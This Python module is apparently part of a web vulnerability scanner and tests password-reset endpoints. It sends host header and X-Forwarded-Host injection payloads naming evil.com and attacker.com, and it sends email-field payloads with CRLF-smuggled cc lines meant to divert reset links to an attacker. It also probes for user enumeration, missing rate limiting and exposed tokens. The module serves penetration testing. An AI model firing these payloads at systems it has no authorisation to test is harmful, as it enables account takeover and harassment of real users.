#!/usr/bin/env python3
"""
Password Reset vulnerability testing module.

Usage:
    python password_reset.py --target https://example.com/forgot-password --output results/
"""

import argparse
import asyncio
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("password_reset")


@dataclass
class PasswordResetVuln:
    """Represents a password reset vulnerability."""

    url: str
    vuln_type: str
    description: str
    evidence: str
    payload: str = ""
    confidence: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "vuln_type": self.vuln_type,
            "description": self.description,
            "evidence": self.evidence[:500] if self.evidence else "",
            "payload": self.payload,
            "confidence": self.confidence,
        }


class PasswordResetTester:
    """
    Password Reset vulnerability tester.

    Features:
    - Token predictability testing
    - Host header injection
    - Email parameter pollution
    - Token reuse testing
    - User enumeration via reset
    - Rate limiting bypass
    """

    HOST_INJECTION_PAYLOADS = [
        "evil.com",
        "attacker.com",
        "{target}.evil.com",
        "evil.com//{target}",
        "{target}@evil.com",
        "{target}.evil.com",
    ]

    EMAIL_MANIPULATION = [
        "{email}@evil.com",
        "{local}+attacker@{domain}",
        "{local}%00@evil.com",
        "{email}\n cc: attacker@evil.com",
        "{email}%0d%0acc:attacker@evil.com",
        "{local}@{domain},.attacker@evil.com",
        "attacker@evil.com,{email}",
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        email_field: str = "email",
        test_email: str = "test@example.com",
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.email_field = email_field
        self.test_email = test_email
        self.verbose = verbose

        self.vulnerabilities: List[PasswordResetVuln] = []
        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

        self.collected_tokens: List[str] = []
        self.baseline_response: Optional[HTTPResponse] = None

    async def test(self) -> ScanResult:
        """Run password reset tests."""
        result = ScanResult(
            tool="password_reset",
            target=self.target,
            config={"timeout": self.timeout},
        )

        logger.info(f"Starting password reset testing for: {self.target}")

        try:
            # Get baseline response
            await self._get_baseline()

            # Test host header injection
            await self._test_host_injection()

            # Test email parameter manipulation
            await self._test_email_manipulation()

            # Test user enumeration
            await self._test_user_enumeration()

            # Test rate limiting
            await self._test_rate_limiting()

            # Test token exposure
            await self._test_token_exposure()

            result.stats = {
                "vulnerabilities_found": len(self.vulnerabilities),
            }

            for vuln in self.vulnerabilities:
                severity_map = {
                    "high": Severity.HIGH,
                    "critical": Severity.CRITICAL,
                    "medium": Severity.MEDIUM,
                    "low": Severity.LOW,
                }
                severity = severity_map.get(vuln.confidence, Severity.MEDIUM)

                result.add_finding(Finding(
                    title=f"Password Reset: {vuln.vuln_type}",
                    severity=severity,
                    description=vuln.description,
                    url=vuln.url,
                    evidence=vuln.evidence,
                    metadata={"payload": vuln.payload},
                    cwe_id="CWE-640",
                    remediation="Implement secure password reset with strong tokens and proper validation.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _get_baseline(self):
        """Get baseline password reset response."""
        logger.info("Getting baseline response...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            response = await client.post(
                self.target,
                data={self.email_field: self.test_email}
            )
            self.baseline_response = response

    async def _test_host_injection(self):
        """Test host header injection in password reset."""
        logger.info("Testing host header injection...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            for payload_template in self.HOST_INJECTION_PAYLOADS:
                payload = payload_template.replace("{target}", self.target_domain)

                # Test Host header
                headers = {"Host": payload}
                try:
                    response = await client.post(
                        self.target,
                        headers=headers,
                        data={self.email_field: self.test_email}
                    )

                    # Check if response indicates injection worked
                    if response.status == 200 and payload in response.body:
                        vuln = PasswordResetVuln(
                            url=self.target,
                            vuln_type="host_header_injection",
                            description="Host header value reflected in password reset response",
                            evidence=f"Injected host '{payload}' found in response",
                            payload=f"Host: {payload}",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found host header injection: {payload}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing host injection: {e}")

                # Test X-Forwarded-Host
                headers = {"X-Forwarded-Host": payload}
                try:
                    response = await client.post(
                        self.target,
                        headers=headers,
                        data={self.email_field: self.test_email}
                    )

                    if response.status == 200 and payload in response.body:
                        vuln = PasswordResetVuln(
                            url=self.target,
                            vuln_type="x_forwarded_host_injection",
                            description="X-Forwarded-Host value used in password reset link",
                            evidence=f"Injected host '{payload}' found in response",
                            payload=f"X-Forwarded-Host: {payload}",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found X-Forwarded-Host injection: {payload}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing X-Forwarded-Host: {e}")

    async def _test_email_manipulation(self):
        """Test email parameter manipulation."""
        logger.info("Testing email parameter manipulation...")

        # Parse test email
        if "@" not in self.test_email:
            return

        local, domain = self.test_email.split("@", 1)

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            for payload_template in self.EMAIL_MANIPULATION:
                payload = payload_template.replace(
                    "{email}", self.test_email
                ).replace(
                    "{local}", local
                ).replace(
                    "{domain}", domain
                )

                try:
                    response = await client.post(
                        self.target,
                        data={self.email_field: payload}
                    )

                    # Check for success indicators
                    if self._indicates_success(response):
                        vuln = PasswordResetVuln(
                            url=self.target,
                            vuln_type="email_manipulation",
                            description=f"Email manipulation accepted: {payload}",
                            evidence=response.body[:200],
                            payload=payload,
                            confidence="medium",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found email manipulation: {payload}")

                except Exception as e:
                    logger.debug(f"Error testing email manipulation: {e}")

    async def _test_user_enumeration(self):
        """Test user enumeration via password reset."""
        logger.info("Testing user enumeration...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            # Test with valid-looking email
            valid_response = await client.post(
                self.target,
                data={self.email_field: self.test_email}
            )

            # Test with definitely invalid email
            invalid_email = f"definitely_nonexistent_{timestamp_now()}@nonexistent-domain-12345.com"
            invalid_response = await client.post(
                self.target,
                data={self.email_field: invalid_email}
            )

            # Compare responses
            if self._responses_differ_significantly(valid_response, invalid_response):
                vuln = PasswordResetVuln(
                    url=self.target,
                    vuln_type="user_enumeration",
                    description="Different responses for valid/invalid emails enable user enumeration",
                    evidence=f"Valid email response: {len(valid_response.body)} bytes, "
                             f"Invalid email response: {len(invalid_response.body)} bytes",
                    confidence="medium",
                )
                self.vulnerabilities.append(vuln)
                logger.info("Found user enumeration via password reset")

    async def _test_rate_limiting(self):
        """Test rate limiting on password reset."""
        logger.info("Testing rate limiting...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            success_count = 0

            for i in range(20):
                try:
                    response = await client.post(
                        self.target,
                        data={self.email_field: self.test_email}
                    )

                    if response.status == 200:
                        success_count += 1
                    elif response.status == 429:
                        logger.info(f"Rate limiting triggered after {i+1} requests")
                        return  # Rate limiting is working

                except Exception as e:
                    logger.debug(f"Error during rate limit test: {e}")

            # If we got here, no rate limiting after 20 requests
            if success_count >= 15:
                vuln = PasswordResetVuln(
                    url=self.target,
                    vuln_type="no_rate_limiting",
                    description="No rate limiting on password reset - enables email flooding",
                    evidence=f"Sent 20 requests, {success_count} succeeded without rate limiting",
                    confidence="medium",
                )
                self.vulnerabilities.append(vuln)
                logger.info("No rate limiting on password reset")

    async def _test_token_exposure(self):
        """Test for token exposure in response."""
        logger.info("Testing for token exposure...")

        if not self.baseline_response:
            return

        body = self.baseline_response.body

        # Look for token patterns in response
        token_patterns = [
            r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
            r'reset[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})',
            r'href["\']?\s*[:=]\s*["\'][^"\']*token=([a-zA-Z0-9_-]{20,})',
            r'["\']([a-f0-9]{32,64})["\']',  # Hex tokens
            r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',  # JWT
        ]

        for pattern in token_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                token = matches[0] if isinstance(matches[0], str) else matches[0][0]
                vuln = PasswordResetVuln(
                    url=self.target,
                    vuln_type="token_exposure",
                    description="Password reset token exposed in HTTP response",
                    evidence=f"Token found in response: {token[:20]}...",
                    payload=pattern,
                    confidence="critical",
                )
                self.vulnerabilities.append(vuln)
                logger.info(f"Found token exposure in response")
                return

        # Check response headers for token
        headers_str = str(self.baseline_response.headers)
        for pattern in token_patterns:
            matches = re.findall(pattern, headers_str, re.IGNORECASE)
            if matches:
                vuln = PasswordResetVuln(
                    url=self.target,
                    vuln_type="token_in_headers",
                    description="Password reset token exposed in response headers",
                    evidence=f"Token found in headers",
                    confidence="critical",
                )
                self.vulnerabilities.append(vuln)
                logger.info("Found token in response headers")
                return

    def _indicates_success(self, response: HTTPResponse) -> bool:
        """Check if response indicates successful password reset initiation."""
        if response.status != 200:
            return False

        success_indicators = [
            "email sent",
            "check your email",
            "reset link",
            "password reset",
            "instructions sent",
            "reset instructions",
            "email has been sent",
        ]

        body_lower = response.body.lower()
        return any(ind in body_lower for ind in success_indicators)

    def _responses_differ_significantly(self, resp1: HTTPResponse, resp2: HTTPResponse) -> bool:
        """Check if two responses differ significantly."""
        # Status code difference
        if resp1.status != resp2.status:
            return True

        # Body length difference > 10%
        len1, len2 = len(resp1.body), len(resp2.body)
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > 0.1:
                return True

        # Different error messages
        error_patterns = [
            r'(user|email|account)\s+(not\s+found|does\s+not\s+exist|invalid)',
            r'no\s+(user|account)\s+found',
            r'(invalid|unknown)\s+(user|email)',
        ]

        for pattern in error_patterns:
            in_resp1 = bool(re.search(pattern, resp1.body, re.IGNORECASE))
            in_resp2 = bool(re.search(pattern, resp2.body, re.IGNORECASE))
            if in_resp1 != in_resp2:
                return True

        return False

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"password_reset_{self.target_domain}")

        vuln_path = self.output_dir / f"password_reset_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump({
                "target": self.target,
                "timestamp": timestamp_now(),
                "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
            }, f, indent=2)
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(description="Password Reset tester")
    parser.add_argument("-t", "--target", required=True, help="Target password reset URL")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("--email-field", default="email", help="Email field name")
    parser.add_argument("--test-email", default="test@example.com", help="Test email address")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    tester = PasswordResetTester(
        target=args.target,
        output_dir=args.output,
        proxy=args.proxy,
        email_field=args.email_field,
        test_email=args.test_email,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"Password Reset Testing Complete")
    print(f"{'='*60}")
    print(f"Vulnerabilities: {len(tester.vulnerabilities)}")
    for name, path in paths.items():
        print(f"  {name}: {path}")


if __name__ == "__main__":
    asyncio.run(main())
